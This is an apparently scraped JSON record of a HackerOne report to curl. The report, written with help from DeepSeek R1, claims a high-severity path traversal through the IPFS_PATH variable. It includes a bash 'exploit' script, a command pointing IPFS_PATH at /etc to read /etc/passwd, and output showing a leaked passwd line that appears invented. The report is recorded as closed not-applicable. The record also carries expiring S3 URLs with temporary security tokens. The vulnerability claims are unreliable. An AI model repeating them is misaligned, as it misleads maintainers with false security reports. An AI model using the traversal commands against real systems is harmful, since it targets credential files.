@@ -1,0 +1,216 @@
+{
+  "id": 3100073,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTAwMDcz",
+  "url": "https://hackerone.com/reports/3100073",
+  "title": "Path Traversal Vulnerability in curl via Unsanitized IPFS_PATH Environment Variable",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-04-18T17:41:17.969Z",
+  "submitted_at": "2025-04-18T17:41:19.380Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ziad616",
+    "url": "/ziad616",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-28T21:11:42.325Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-06-28T12:25:56.770Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "A path traversal vulnerability exists in curl versions with IPFS support (7.81.0+). The IPFS_PATH environment variable is not properly sanitized, allowing attackers to read arbitrary files by manipulating directory traversal sequences (e.g., ../../../../etc). This flaw enables leakage of sensitive data (e.g., SSH keys, credentials, system files) via DNS/HTTP error messages.\n\n## Type of AI used:\n\nDeepseek R1 (in some search and steps to reproduce and clear description of vuln )\n\n## Affected version:\ncurl 8.13.0 (and all 7.81.0+ releases with IPFS support)\n\n## curl --version:\n\n(x86_64-pc-linux-gnu) libcurl/8.13.0 GnuTLS/3.8.6 zlib/1.3.1 brotli/1.1.0 zstd/1.5.6 libidn2/2.3.7 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.62.1 ngtcp2/1.6.0 nghttp3/1.4.0 librtmp/2.3 OpenLDAP/2.6.9\nRelease-Date: 2025-04-02, security patched: 8.13.0-1\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd\n\n## System:\n\nKali GNU/Linux Rolling\n\n## Applicable to:\n\n1.CI/CD pipelines (leak build secrets).\n\n2.Containers (escape to read host files).\n\n3.Shared hosting environments.\n\n## Steps To Reproduce (simple way):\n\n  1. make data-fetcher.sh\n  2. add this to data-fetcher.sh\n  ```\n  #!/bin/bash\n\n # 1. Create test file with unique URL-like content\n TEST_CONTENT=\"http://LEAKED_DATA_$(date +%s).invalid\"\n echo \"$TEST_CONTENT\" > /tmp/test_file.txt\n\n # 2. Setup exploit\n EXPLOIT_DIR=$(mktemp -d)\n ln -sf /tmp/test_file.txt \"$EXPLOIT_DIR/gateway\"\n export IPFS_PATH=\"$EXPLOIT_DIR\"\n\n # 3. Trigger the vulnerability\n echo \"[+] Testing exploit - should leak: $TEST_CONTENT\"\n curl -v ipfs://dummycid 2>&1 | grep -A1 \"Could not resolve host\"\n\n # 4. Cleanup\n unset IPFS_PATH\n rm -rf \"$EXPLOIT_DIR\" /tmp/test_file.txt\n ```\n 3. run\n\n ```\n  chmod +x data-fetcher.sh\n ./data-fetcher.sh\n ```\n output:\n ```\n [+] Testing exploit - should leak: http://LEAKED_DATA_1744992527.invalid\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: LEAKED_DATA_1744992527.invalid\n shutting down connection #0\n curl: (6) Could not resolve host: LEAKED_DATA_1744992527.invalid\n\n ```\n\n## Simple Example:\n\n   Scenario: Document Viewer App\n   App Purpose: Lets users view files stored on IPFS (e.g., ipfs://QmPDF).\n\n   How It Works:\n\n   ```\n   # App uses curl to fetch files  \n   curl --ipfs-gateway https://trusted-gateway.com ipfs://QmPDF  \n   ```\n\n   Attack (No App Compromise)\n   Attacker Action: Sets a malicious path:\n\n   ```\n   export IPFS_PATH=\"/tmp/../../../../etc\"  # Traverse to /etc  \n   (No hacking required! Just setting an environment variable.)\n\n   ```\n   User Action: Uses the app normally (e.g., clicks \"View PDF\").\n\n   Result:\n\n   curl reads /etc/passwd instead of the PDF.\n\n   File contents leak via errors:\n\n   ```\n   curl: (6) Could not resolve host: root:x:0:0:root:/root:/bin/bash \n\n   ```\n\n   Key Clarifications\n   App is Not at Fault:\n\n   Uses curl correctly.\n\n   No code flaws or misconfigurations.\n\n   Attacker Needs Only:\n\n   Access to set environment variables (e.g., in shared hosting, CI/CD).\n\n   No app/backend hacking required.\n\n   User is Innocent:\n\n   Just uses the app normally.\n\n   Real-World Analogy\n\n   Imagine a delivery app (curl) that blindly trusts addresses provided by outsiders (IPFS_PATH).\n\n   Attacker: Tricks the app into delivering a package to /etc/passwd instead of the user’s home.\n\n   Result: The app leaks sensitive mail (files) it shouldn’t access.\n\n## Mitigation:\n   1.Sanitize IPFS_PATH:\n\n   2.Use realpath() to resolve absolute paths.\n\n   3.Block directory traversal sequences (..).\n\n   4.Disable IPFS by Default: Enable only in trusted environments.\n\n## CVSS:3.1:\n        /AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (High)\n\n## Supporting Material/References:\n{F4265018}\n{F4265019}\n{F4265020}\n{F4265023}\n\n## Impact\n\nTheft of credentials, SSH keys, and system files.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4265018,
+      "file_name": "Screenshot_from_2025-04-18_18-26-02.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cjtesc7b972hbwu26ptgum9944nr?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2025-04-18_18-26-02.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2025-04-18_18-26-02.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRDWZ32LF%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDsaCXVzLXdlc3QtMiJHMEUCIQCknWLwaSzkhwLF2IhyyRW2B4lUHJTy0tuB6NfJrAMEPwIgPe1eMY2xHmPnitNbHKOoNiIjZqmcY23NigaZQrMXuwYqsgUIBBADGgwwMTM2MTkyNzQ4NDkiDOOBqt6NH8K00sybfCqPBULvQIimyjKwpvGj93i%2F4nftqeZrQCPovwIAJj8SpiN5dXZLxnaHtifPqBMQDEWIjlaPn4vVr0%2F%2BR3RHg8UdGFFZjqJekjv46veqT6elA6QUvSXtZX4bjzmRs2Cbxal06FSU%2F4x%2FQuKz2%2BdUIEmTh1TCS8PjN5GdOa90%2FLB1Im7dD8miwNGOO6QF0hWs9PO91qX4kPySUUTJGtIbOQPJkMbi2aZKUeRXjkJy5T6D4hR6CYhl%2FfctjALZQq99VC0P%2BDhhgzPxkgSWDZAEKfxM6hHXKi2hwrsu%2FPQ3FcPZIVt%2BWGQmtqPo1gL8MX%2Frt0A4%2F6aQLnEG686goXoZCP8zr1HLK%2Fz6tko0vWRpgClodogBcIgfqnfwZ7SdlFnFA44RtsB5E6BnG9tQ2aliXz39WvDR0BLjEdVpmlV9de9m3UCFNRprleBqgFAe3GculwWUsOHHV3Pvr96%2FSR1gNBn4rfRvVVXbr48m3WZTBP21Ljmbiie1SKCykglF7P%2BqCSJr6PG%2BLm5kv5OqdBFdy9i8hmiWS7CfW3a3IRBLC3EANOuN7K1ZHZsUKbNd1%2B%2Fo0yPuavycpQu%2BnFQNOzXuVyycwG7q1lXh2WH9sVY%2BQkiKP3mHvingj8AcO8nWkC1W%2Bpa8STiy1QXXshKPIwPNIJkf%2FTdZPGcBaLHqJ%2FuT0uwILCglXjriPIJA%2B9JpQ6F13Dau5uYphJRO5vgrCvD3Dt1OcHLGEG3VoLDWvjlr%2BmR4RxsWsr0aBBFhovgrogWHxjU%2BmoJP6yIMZyLGlEHFviGc5E3%2BqAJRDhtzYXUGFrSDjQ6aQWt8awQcjToZBa2hnshavLSHxSiPDX8Sn%2BF6nKelJ4u6beBJI718ZEZJnM4ZKU4wpMuc0gY6sQGn674ptdI2qmkB0jjPGJq99%2FMSl0ls3DErYAXGWSSgqlxdtVGdrtvN2RbsoeK63%2FwGemofKhiU5IbAXlbCNVPl51teQkMGBNsWnXv5%2FvSWXx4eND3tuPCGe8uYIWyY%2BvsovM7kp9Evz%2BgpmoyN63lCh%2FSkZQR%2FMCqC8sCV25Olh81S5Q7ls3VTTPkEa51TVbORaW9U5m6hsoh9xxMixqyScV5Hu%2FNNlybOuYTcNFIIgK8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ef229f09b8935cf2f8e3869afc833a8c089564b273ef0900d4e8f1e62f0f2c91",
+      "file_size": 12771,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 4265019,
+      "file_name": "Screenshot_from_2025-04-18_18-25-17.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nzkbcgodrkp5tf0ckhapl8qt4vpx?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2025-04-18_18-25-17.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2025-04-18_18-25-17.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRDWZ32LF%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDsaCXVzLXdlc3QtMiJHMEUCIQCknWLwaSzkhwLF2IhyyRW2B4lUHJTy0tuB6NfJrAMEPwIgPe1eMY2xHmPnitNbHKOoNiIjZqmcY23NigaZQrMXuwYqsgUIBBADGgwwMTM2MTkyNzQ4NDkiDOOBqt6NH8K00sybfCqPBULvQIimyjKwpvGj93i%2F4nftqeZrQCPovwIAJj8SpiN5dXZLxnaHtifPqBMQDEWIjlaPn4vVr0%2F%2BR3RHg8UdGFFZjqJekjv46veqT6elA6QUvSXtZX4bjzmRs2Cbxal06FSU%2F4x%2FQuKz2%2BdUIEmTh1TCS8PjN5GdOa90%2FLB1Im7dD8miwNGOO6QF0hWs9PO91qX4kPySUUTJGtIbOQPJkMbi2aZKUeRXjkJy5T6D4hR6CYhl%2FfctjALZQq99VC0P%2BDhhgzPxkgSWDZAEKfxM6hHXKi2hwrsu%2FPQ3FcPZIVt%2BWGQmtqPo1gL8MX%2Frt0A4%2F6aQLnEG686goXoZCP8zr1HLK%2Fz6tko0vWRpgClodogBcIgfqnfwZ7SdlFnFA44RtsB5E6BnG9tQ2aliXz39WvDR0BLjEdVpmlV9de9m3UCFNRprleBqgFAe3GculwWUsOHHV3Pvr96%2FSR1gNBn4rfRvVVXbr48m3WZTBP21Ljmbiie1SKCykglF7P%2BqCSJr6PG%2BLm5kv5OqdBFdy9i8hmiWS7CfW3a3IRBLC3EANOuN7K1ZHZsUKbNd1%2B%2Fo0yPuavycpQu%2BnFQNOzXuVyycwG7q1lXh2WH9sVY%2BQkiKP3mHvingj8AcO8nWkC1W%2Bpa8STiy1QXXshKPIwPNIJkf%2FTdZPGcBaLHqJ%2FuT0uwILCglXjriPIJA%2B9JpQ6F13Dau5uYphJRO5vgrCvD3Dt1OcHLGEG3VoLDWvjlr%2BmR4RxsWsr0aBBFhovgrogWHxjU%2BmoJP6yIMZyLGlEHFviGc5E3%2BqAJRDhtzYXUGFrSDjQ6aQWt8awQcjToZBa2hnshavLSHxSiPDX8Sn%2BF6nKelJ4u6beBJI718ZEZJnM4ZKU4wpMuc0gY6sQGn674ptdI2qmkB0jjPGJq99%2FMSl0ls3DErYAXGWSSgqlxdtVGdrtvN2RbsoeK63%2FwGemofKhiU5IbAXlbCNVPl51teQkMGBNsWnXv5%2FvSWXx4eND3tuPCGe8uYIWyY%2BvsovM7kp9Evz%2BgpmoyN63lCh%2FSkZQR%2FMCqC8sCV25Olh81S5Q7ls3VTTPkEa51TVbORaW9U5m6hsoh9xxMixqyScV5Hu%2FNNlybOuYTcNFIIgK8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8d0f1b2cc9c6e0ff7aaf2ac9b805cac20e91db5a9e3810a1e20928fc509ff3ba",
+      "file_size": 45329,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 4265020,
+      "file_name": "Screenshot_from_2025-04-18_18-25-05.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lqqk80itlchyddhzyuprtm1mlcqn?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2025-04-18_18-25-05.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2025-04-18_18-25-05.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRDWZ32LF%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDsaCXVzLXdlc3QtMiJHMEUCIQCknWLwaSzkhwLF2IhyyRW2B4lUHJTy0tuB6NfJrAMEPwIgPe1eMY2xHmPnitNbHKOoNiIjZqmcY23NigaZQrMXuwYqsgUIBBADGgwwMTM2MTkyNzQ4NDkiDOOBqt6NH8K00sybfCqPBULvQIimyjKwpvGj93i%2F4nftqeZrQCPovwIAJj8SpiN5dXZLxnaHtifPqBMQDEWIjlaPn4vVr0%2F%2BR3RHg8UdGFFZjqJekjv46veqT6elA6QUvSXtZX4bjzmRs2Cbxal06FSU%2F4x%2FQuKz2%2BdUIEmTh1TCS8PjN5GdOa90%2FLB1Im7dD8miwNGOO6QF0hWs9PO91qX4kPySUUTJGtIbOQPJkMbi2aZKUeRXjkJy5T6D4hR6CYhl%2FfctjALZQq99VC0P%2BDhhgzPxkgSWDZAEKfxM6hHXKi2hwrsu%2FPQ3FcPZIVt%2BWGQmtqPo1gL8MX%2Frt0A4%2F6aQLnEG686goXoZCP8zr1HLK%2Fz6tko0vWRpgClodogBcIgfqnfwZ7SdlFnFA44RtsB5E6BnG9tQ2aliXz39WvDR0BLjEdVpmlV9de9m3UCFNRprleBqgFAe3GculwWUsOHHV3Pvr96%2FSR1gNBn4rfRvVVXbr48m3WZTBP21Ljmbiie1SKCykglF7P%2BqCSJr6PG%2BLm5kv5OqdBFdy9i8hmiWS7CfW3a3IRBLC3EANOuN7K1ZHZsUKbNd1%2B%2Fo0yPuavycpQu%2BnFQNOzXuVyycwG7q1lXh2WH9sVY%2BQkiKP3mHvingj8AcO8nWkC1W%2Bpa8STiy1QXXshKPIwPNIJkf%2FTdZPGcBaLHqJ%2FuT0uwILCglXjriPIJA%2B9JpQ6F13Dau5uYphJRO5vgrCvD3Dt1OcHLGEG3VoLDWvjlr%2BmR4RxsWsr0aBBFhovgrogWHxjU%2BmoJP6yIMZyLGlEHFviGc5E3%2BqAJRDhtzYXUGFrSDjQ6aQWt8awQcjToZBa2hnshavLSHxSiPDX8Sn%2BF6nKelJ4u6beBJI718ZEZJnM4ZKU4wpMuc0gY6sQGn674ptdI2qmkB0jjPGJq99%2FMSl0ls3DErYAXGWSSgqlxdtVGdrtvN2RbsoeK63%2FwGemofKhiU5IbAXlbCNVPl51teQkMGBNsWnXv5%2FvSWXx4eND3tuPCGe8uYIWyY%2BvsovM7kp9Evz%2BgpmoyN63lCh%2FSkZQR%2FMCqC8sCV25Olh81S5Q7ls3VTTPkEa51TVbORaW9U5m6hsoh9xxMixqyScV5Hu%2FNNlybOuYTcNFIIgK8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2146c72dc558fe22081f7198ef2e4acc1f25e31e1bfce9b7c67acb669d43a366",
+      "file_size": 55520,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 4265023,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ifujxjnarkgg41ynurkorkfnf048?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRDWZ32LF%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDsaCXVzLXdlc3QtMiJHMEUCIQCknWLwaSzkhwLF2IhyyRW2B4lUHJTy0tuB6NfJrAMEPwIgPe1eMY2xHmPnitNbHKOoNiIjZqmcY23NigaZQrMXuwYqsgUIBBADGgwwMTM2MTkyNzQ4NDkiDOOBqt6NH8K00sybfCqPBULvQIimyjKwpvGj93i%2F4nftqeZrQCPovwIAJj8SpiN5dXZLxnaHtifPqBMQDEWIjlaPn4vVr0%2F%2BR3RHg8UdGFFZjqJekjv46veqT6elA6QUvSXtZX4bjzmRs2Cbxal06FSU%2F4x%2FQuKz2%2BdUIEmTh1TCS8PjN5GdOa90%2FLB1Im7dD8miwNGOO6QF0hWs9PO91qX4kPySUUTJGtIbOQPJkMbi2aZKUeRXjkJy5T6D4hR6CYhl%2FfctjALZQq99VC0P%2BDhhgzPxkgSWDZAEKfxM6hHXKi2hwrsu%2FPQ3FcPZIVt%2BWGQmtqPo1gL8MX%2Frt0A4%2F6aQLnEG686goXoZCP8zr1HLK%2Fz6tko0vWRpgClodogBcIgfqnfwZ7SdlFnFA44RtsB5E6BnG9tQ2aliXz39WvDR0BLjEdVpmlV9de9m3UCFNRprleBqgFAe3GculwWUsOHHV3Pvr96%2FSR1gNBn4rfRvVVXbr48m3WZTBP21Ljmbiie1SKCykglF7P%2BqCSJr6PG%2BLm5kv5OqdBFdy9i8hmiWS7CfW3a3IRBLC3EANOuN7K1ZHZsUKbNd1%2B%2Fo0yPuavycpQu%2BnFQNOzXuVyycwG7q1lXh2WH9sVY%2BQkiKP3mHvingj8AcO8nWkC1W%2Bpa8STiy1QXXshKPIwPNIJkf%2FTdZPGcBaLHqJ%2FuT0uwILCglXjriPIJA%2B9JpQ6F13Dau5uYphJRO5vgrCvD3Dt1OcHLGEG3VoLDWvjlr%2BmR4RxsWsr0aBBFhovgrogWHxjU%2BmoJP6yIMZyLGlEHFviGc5E3%2BqAJRDhtzYXUGFrSDjQ6aQWt8awQcjToZBa2hnshavLSHxSiPDX8Sn%2BF6nKelJ4u6beBJI718ZEZJnM4ZKU4wpMuc0gY6sQGn674ptdI2qmkB0jjPGJq99%2FMSl0ls3DErYAXGWSSgqlxdtVGdrtvN2RbsoeK63%2FwGemofKhiU5IbAXlbCNVPl51teQkMGBNsWnXv5%2FvSWXx4eND3tuPCGe8uYIWyY%2BvsovM7kp9Evz%2BgpmoyN63lCh%2FSkZQR%2FMCqC8sCV25Olh81S5Q7ls3VTTPkEa51TVbORaW9U5m6hsoh9xxMixqyScV5Hu%2FNNlybOuYTcNFIIgK8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2cb45fbb5f36716a68826a35b4e4d6157359e71086651d4e3b5ec5f94ffbf56f",
+      "file_size": 87175,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "ryel",
+    "almuntadhar0x01",
+    "thalaivar304",
+    "2urk1_66",
+    "2026",
+    "shahid803",
+    "mira7",
+    "hunt_98"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3100073",
+  "votes": 8,
+  "latest_disclosable_activity_at": "2025-06-28T21:11:42.201Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:30:26.975109",
+    "source": "https://hackerone.com/reports/3100073.json",
+    "report_id": 3100073
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTAwMDcz",
+    "databaseId": "3100073",
+    "title": "Path Traversal Vulnerability in curl via Unsanitized IPFS_PATH Environment Variable",
+    "url": "https://hackerone.com/reports/3100073",
+    "state": null,
+    "substate": "not-applicable",
+    "disclosed_at": "2025-06-28T21:11:42.325Z",
+    "created_at": "2025-04-18T17:41:17.969Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE5",
+      "name": "Path Traversal",
+      "external_id": "cwe-22"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "ziad616"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzMxMDAwNzM=",
+    "_id": "3100073",
+    "disclosed": true,
+    "votes": 8,
+    "latest_disclosable_activity_at": "2025-06-28T21:11:42.201Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTAwMDcz",
+      "databaseId": "3100073",
+      "title": "Path Traversal Vulnerability in curl via Unsanitized IPFS_PATH Environment Variable",
+      "url": "https://hackerone.com/reports/3100073",
+      "disclosed_at": "2025-06-28T21:11:42.325Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
